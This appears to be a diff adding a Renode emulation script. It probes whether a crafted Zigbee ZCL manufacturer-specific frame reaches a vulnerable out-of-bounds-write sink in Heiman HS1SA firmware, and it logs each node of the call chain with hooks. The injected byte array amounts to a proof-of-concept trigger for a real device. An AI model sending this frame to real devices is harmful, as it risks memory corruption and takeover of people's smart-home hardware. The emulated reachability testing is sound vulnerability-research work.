@@ -1,0 +1,56 @@
+:name: ZB-06 HS1SA — OVER-THE-AIR reachability probe (SOURCE->SINK)
+:description: Injects a REAL 802.15.4/ZCL manufacturer-specific frame (mfgCode 0x120B, cmdId 0xF3) into the booted Heiman HS1SA firmware's radio RX path and observes, via per-node PC hooks, how far the firmware's OWN code walks the frame down the chain sub_C22C->sub_E376->sub_7D46->sub_7B5A->sub_a33c->sub_1662e. This tests reachability WITHOUT forcing PC.
+#
+# Chain (absolute addrs in loaded image):
+#   sub_C22C 0xC22C  post-RX 802.15.4 frame handler (dequeues <=125B via sub_120B0)
+#   sub_E376 0xE376  -> sub_7D46 0x7D46 -> sub_7B5A 0x7B5A
+#   sub_a33c 0xA33C  gate: mfgCode==0x120B && dir==0 && cmdId==0xF3 -> tail-call sink
+#   sub_1662e 0x1662E the vulnerable sink (unbounded record-count OOB write)
+#
+# Injection incantation (established this session):
+#   sysbus.radio ReceiveFrame [b0,b1,...] sysbus.radio
+#   - Byte[] literal uses COMMA separators.
+#   - The IRadio 'sender' arg may be the radio itself; ReceiveFrame only uses it
+#     for InterferenceQueue lookup (returns Empty if absent -> harmless) and RSSI.
+
+using sysbus
+emulation SetGlobalSerialExecution true
+emulation CreateIEEE802_15_4Medium "wireless"
+
+mach create "hs1sa"
+machine LoadPlatformDescription @platforms/boards/silabs/brd4180a.repl
+sysbus LoadELF @scripts/silabs-vuln/hs1sa.elf
+cpu VectorTableOffset 0x6000
+connector Connect sysbus.radio wireless
+
+logLevel 3
+# radio -> INFO (level 1) so ReceiveFrame() and the RX-state drop reason are visible
+logLevel 1 sysbus.radio
+
+# --- Positive control: an address on the normal boot path (proves hooks fire).
+cpu AddHook 0x7896 "self.ErrorLog('ZB06MARK_CTRL_7896')"
+# --- Chain-node markers (distinct string per node).
+cpu AddHook 0xc22c  "self.ErrorLog('ZB06MARK_NODE1_C22C')"
+cpu AddHook 0xe376  "self.ErrorLog('ZB06MARK_NODE2_E376')"
+cpu AddHook 0x7d46  "self.ErrorLog('ZB06MARK_NODE3_7D46')"
+cpu AddHook 0x7b5a  "self.ErrorLog('ZB06MARK_NODE4_7B5A')"
+cpu AddHook 0xa33c  "self.ErrorLog('ZB06MARK_NODE5_A33C_GATE')"
+cpu AddHook 0x1662e "self.ErrorLog('ZB06MARK_NODE6_1662E_SINK')"
+
+# --- Boot the firmware (radio bring-up happens in first ~1.2ms).
+emulation RunFor "0.3"
+pause
+
+echo ">>> post-boot radio channel:"
+sysbus.radio Channel
+
+echo ">>> INJECTING crafted mfg-0x120B / cmdId-0xF3 frame via radio.ReceiveFrame ..."
+sysbus.radio ReceiveFrame [0xA7,0x00,0x00,0x00,0x61,0x88,0x42,0x34,0x12,0x00,0x00,0x22,0x11,0x48,0x02,0x00,0x00,0x22,0x11,0x1E,0x55,0x40,0x01,0x00,0xFC,0x04,0x01,0x01,0x77,0x05,0x0B,0x12,0x42,0xF3,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x28,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x41,0x41,0x41,0x6E,0x01,0x20,0x00,0x41,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00] sysbus.radio
+
+# --- Let the firmware react to the (attempted) reception.
+emulation RunFor "0.1"
+pause
+
+echo ">>> post-injection CPU PC / halted:"
+cpu PC
+cpu IsHalted
